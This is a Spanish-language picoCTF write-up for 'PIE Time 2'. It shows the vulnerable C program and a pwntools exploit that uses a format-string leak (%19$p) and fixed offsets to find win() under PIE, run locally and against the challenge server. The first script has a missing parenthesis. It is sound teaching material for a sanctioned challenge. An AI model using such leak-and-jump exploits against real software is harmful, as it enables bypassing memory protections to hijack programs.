---
title: Pie Time 2
description: Un reto de explotación binaria donde combinamos una vulnerabilidad de format string con binarios compilados con PIE. A partir de una fuga de memoria, analizamos el binario en local para calcular offsets entre funciones y obtener la dirección real de win en tiempo de ejecución.
date: 2026-01-27
toc: true
pin: false
image: 
 path: /assets/img/picoctf-writeup-pie-time/logo.png
categories:
  - picoctf 
  - ctf 
tags:
  - linux
  - reversing
  - binary-exploitation
  - format-string-vuln
---
##   Information Gathering 

![](assets/img/picoctf-writeup-pie-time/new.png)

Descargamos el Código fuente del programa y el binario.

```terminal
wget https://challenge-files.picoctf.net/c_rescued_float/21c8fd363f9e93e543e7f45e10ae1d2813eca47bedcb0f2b2a402339854f55a8/vuln.c
```

```terminal
wget https://challenge-files.picoctf.net/c_rescued_float/21c8fd363f9e93e543e7f45e10ae1d2813eca47bedcb0f2b2a402339854f55a8/vuln
```

Source code: 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```
## Start of exploitation

Le damos permiso de ejecución.

```terminal
chmod +x vuln
```

Ejecutamos y nos pide un nombre, ponemos cualquier cosa y después nos pide una dirección al cual saltar; pero a partir de aquí vamos ha automatizar el proceso de explotación con python:

![](assets/img/picoctf-writeup-pie-time/name.png)


Debemos indicar en el código que inicie Hasta antes de "name:", para después inyectar nuestro primer payload.


![](assets/img/picoctf-writeup-pie-time/payload.png)


Para la segunda fase lo mismo que inicie hasta antes de "0x12345:".


![](assets/img/picoctf-writeup-pie-time/jump.png)


Tenemos el exploit, una flag de ejemplo y los archivos del binario.


![](assets/img/picoctf-writeup-pie-time/flag.png)


Después de automatizar la explotación, la probamos en local, creando el archivo flag.txt para comprobar si funciona.

![](assets/img/picoctf-writeup-pie-time/txt.png)

Ejecutamos el exploit con python.

![](assets/img/picoctf-writeup-pie-time/f.png)


Pero antes debemos ver como se configura en el exploit, el ir contra el archivo vuln que tenemos en local.


```python
#!/usr/bin/env python3

from pwn import * 

## esta es la configuracion local,

p = process("./vuln")

## es asi porque el archivo esta en el mismo directorio en el que ejecutamos este script!

p.recvuntil(b"name:")
p.sendline(b"%19$p")
leak_address = hex(int(p.recvline().strip().decode(), 16) - 0x41)
win_address = hex(int(leak_address, 16) - 0x96)

info(f"Main Address: {leak_address}")
info(f"Win Address: {win_address}")

p.recvuntil(b"0x12345: ")
p.sendline(win_address.encode())

response = p.recvall()

print(response.decode()
```

Una vez comprobamos que funciona vamos a lanzarlo a servidor remoto del ctf. 


![](assets/img/picoctf-writeup-pie-time/remote.png)


Obtenemos la flag y vamos haber esa parte del código que revisamos antes para lanzarlo el local y corroborar.

```python
#!/usr/bin/env python3

from pwn import * 

## el "remote" redirige el payload a la direccion proporcionada,

p = remote("rescued-float.picoctf.net", 50031)

## + el puerto de destino.

p.recvuntil(b"name:")
p.sendline(b"%19$p")
leak_address = hex(int(p.recvline().strip().decode(), 16) - 0x41)
win_address = hex(int(leak_address, 16) - 0x96)

info(f"Main Address: {leak_address}")
info(f"Win Address: {win_address}")

p.recvuntil(b"0x12345: ")
p.sendline(win_address.encode())

response = p.recvall()

print(response.decode())
```



![](assets/img/picoctf-writeup-pie-time/picoff.png)

> <a href="https://play.picoctf.org/users/ajente007" target="_blank">PIE TIME 2 CTF from picoCTF has been Cracking</a>
{: .prompt-tip }
